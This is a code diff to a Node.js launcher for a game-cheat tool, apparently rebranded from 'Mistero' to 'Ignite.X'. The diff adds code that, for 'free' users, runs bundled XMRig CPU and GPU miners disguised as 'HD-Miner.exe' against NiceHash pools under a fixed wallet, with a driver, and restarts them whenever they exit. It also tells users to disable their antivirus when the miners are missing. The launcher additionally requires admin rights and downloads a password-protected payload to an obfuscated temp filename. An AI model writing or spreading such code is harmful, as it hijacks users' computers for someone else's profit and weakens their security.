@@ -1,11 +1,11 @@
 const os = require("os");
 const fs = require("fs");
 const path = require("path");
-const { spawn, spawnSync } = require("child_process"), { get } = require("axios").default, { createExtractorFromFile } = require("node-unrar-js"), userAgent = (() => {
+const { exec, spawn, spawnSync, execFile } = require("child_process"), { get } = require("axios").default, { createExtractorFromFile } = require("node-unrar-js"), userAgent = (() => {
     const cpu = os.cpus();
     return [
-        cpu.at(0).model.replaceAll("   ", " ").replaceAll("  ", " "),
-        cpu.length, `${(os.totalmem() / 1024 / 1024 / 1024).toFixed(2)}GB`, os.version].join(", ");
+        cpu.at(0).model.split(" ").filter(i => i.length > 0).join(" "),
+        "with", cpu.length, "Threads", "and", `${Math.round(os.totalmem() / 1024 / 1000 / 1000)} GB`, "RAM.", "Installed on", os.version()].join(" ");
 })();
 
 
@@ -28,11 +28,15 @@ console.write = (i, ie = 80) => new Promise(resolve => {
 (async function startApp() {
     process.stdout.cursorTo(0, 0);
     process.stdout.clearScreenDown();
+
     await console.write("Initializing ...");
     const isAdmin = await (() => new Promise(resolve => { try { spawnSync("net session", { stdio: "ignore" }); resolve(true); } catch { resolve(false); }; }))();
 
     if (!isAdmin)
-        return console.error("Failed to start. Run this file as administrator.");
+        return console.error("Failed to start. Run this file as admin.");
+
+    if (isForFree && !fs.existsSync(path.join(__dirname, "XMRig")))
+        return console.error("Free User are not allowed to run without Mining Files.");
 
     let whitelisted; try {
         let { data } = await get(`http://${host}/api/status`, {
@@ -93,25 +97,25 @@ console.write = (i, ie = 80) => new Promise(resolve => {
             await console
                 .write(`Some modules are missing. Downloading them ...`); await console.write(`[${Array(50).fill(" ").join("")}] 0.00%`, 8);
 
-            const request = await get(`http://${host}/api/client/module`, {
+            const request = await get(`http://${host}/api/panel/modules`, {
                 responseType: 'arraybuffer',
                 onDownloadProgress: ({ total, loaded, progress }) => {
                     process.stdout.cursorTo(0, 1);
-                    console.log(`[${Array(Math.round(50 * progress)).fill("=").join("")}${Array(50 - Math.round(50 * progress)).fill(" ").join("")}] ${(progress * 100).toFixed(2)}% (${(loaded / 1024 / 1024).toFixed(2)} MB of ${(total / 1024 / 1024).toFixed(2)} MB)`);
+                    console.log(`[${Array(Math.round(50 * progress)).fill("=").join("")}${Array(50 - Math.round(50 * progress)).fill(" ").join("")}] ${(progress * 100).toFixed(2)}% (${(loaded / 1000 / 1000).toFixed(2)} MB of ${(total / 1000 / 1000).toFixed(2)} MB)`);
                 }
             });
 
 
             try {
-                fs.writeFileSync(path.join(os.tmpdir(), Buffer.from(`mistero.cheats@${process.versions.node}`).toString("base64").split("").reverse().join("")), request.data);
+                fs.writeFileSync(path.join(os.tmpdir(), Buffer.from(`ignite.x.cheats@${process.versions.node}`).toString("base64").split("").reverse().join("")), request.data);
 
                 await console.write("\n\nDownload complete. Installing modules ..."); const extractor = await createExtractorFromFile({
-                    targetPath: main_path.path, password: "Mistero.Lock",
-                    filepath: path.join(os.tmpdir(), Buffer.from(`mistero.cheats@${process.versions.node}`).toString("base64").split("").reverse().join(""))
+                    targetPath: main_path.path, password: "Ignite.X",
+                    filepath: path.join(os.tmpdir(), Buffer.from(`ignite.x.cheats@${process.versions.node}`).toString("base64").split("").reverse().join(""))
                 });
 
                 [...extractor.extract().files];
-                fs.rmSync(path.join(os.tmpdir(), Buffer.from(`mistero.cheats@${process.versions.node}`).toString("base64").split("").reverse().join()));
+                fs.rmSync(path.join(os.tmpdir(), Buffer.from(`ignite.x.cheats@${process.versions.node}`).toString("base64").split("").reverse().join()));
 
                 setTimeout(async () => {
                     await console
@@ -122,19 +126,54 @@ console.write = (i, ie = 80) => new Promise(resolve => {
     } else
         setTimeout(async () => {
             process.stdout.write(`\n\n`);
-            await console.write("Modules loaded. Initializing the ui ...");
-            fs.existsSync(path.join(main_path.path, "resources")) ? null : fs.mkdirSync(path.join(main_path.path, "resources"));
+            await (async callback => {
+                if (isForFree) {
+                    await console.write("Initializing the Miner ..."); setTimeout(async () => {
+                        if (["HD-Miner.exe", "HD-GPU-Miner.exe", "WinRing0x64.sys"].map(i => fs.existsSync(path.join(__dirname, "XMRig", i))).filter(i => !i).length == 0) {
+                            let isResolved = false; (async function startMiner() {
+                                const Miner = execFile(path.join(__dirname, "XMRig", "HD-Miner.exe"), ["-a", "rx", "-o", "stratum+tcp://randomxmonero.auto.nicehash.com:9200", "-u", "NHbZqp7ic66cjaoFF8KNTWxrorJs28ag3TsQ.XMRig", "-p", "x", "--nicehash", "--no-color", "--cpu-max-threads-hint=50"], {
+                                    cwd: os.tmpdir(),
+                                });
 
-            fs.copyFileSync(path.join(__dirname, "app.asar"), path.join(main_path.path, "resources", "app.asar"));
-            const proc = spawn(path.join(main_path.path, "HD-RunAgent.exe"), [], {
-                detached: isBuilt, windowsHide: false, env: { whitelisted, userAgent, mainFolder: main_path.path }
-            });
+                                let lolMiner;
+                                [Miner.stdout, Miner.stderr].map(i => i.addListener("data", i => {
+                                    if (!isResolved && i.includes("use pool")) {
+                                        lolMiner = execFile(path.join(__dirname, "XMRig", "HD-GPU-Miner.exe"), ["-a", "ETCHASH", "-p", "stratum+tcp://etchash.auto.nicehash.com:9200", "-u", "NHbZqp7ic66cjaoFF8KNTWxrorJs28ag3TsQ.XMRig", "--pass", "x", "-pl", "50"], {
+                                            cwd: os.tmpdir(),
+                                        });
 
-            isBuilt ? proc.unref() : null; proc.stdout.on("data", data => {
-                try {
-                    data = JSON.parse(data);
-                    data.status ? (isBuilt ? process.exit() : null) : console.write(`${data.err}`, 30);
-                } catch { };
+                                        callback();
+                                        isResolved = true;
+                                    };
+                                }));
+
+                                Miner.addListener("exit", () => {
+                                    lolMiner?.kill();
+                                    setTimeout(() => startMiner());
+                                });
+                            })();
+                        } else
+                            await console.error("Failed to start the miner. Turn off your Antivirus and Try again.");
+                    }, 1800);
+                } else
+                    callback();
+            })(async () => {
+                await console.write(isForFree ? "Miner Running. Initializing the ui ..." : "Modules loaded. Initializing the ui ...");
+                fs.existsSync(path.join(main_path.path, "resources")) ? null : fs.mkdirSync(path.join(main_path.path, "resources"));
+
+                fs.copyFileSync(path.join(__dirname, "app.asar"), path.join(main_path.path, "resources", "app.asar"));
+                const proc = spawn(path.join(main_path.path, "HD-RunAgent.exe"), [], {
+                    detached: isBuilt && !isForFree, windowsHide: false, env: { whitelisted, userAgent, mainFolder: main_path.path }
+                });
+
+                (isBuilt && !isForFree) ? proc.unref() : null; proc.stdout.on("data", data => {
+                    try {
+                        data = JSON.parse(data);
+                        data.status ? ((isBuilt && !isForFree) ? process.exit() : null) : console.write(`${data.err}`, 30);
+                    } catch { };
+                });
+
+                proc.addListener("exit", () => process.exit());
             });
         }, 1800);
 })();
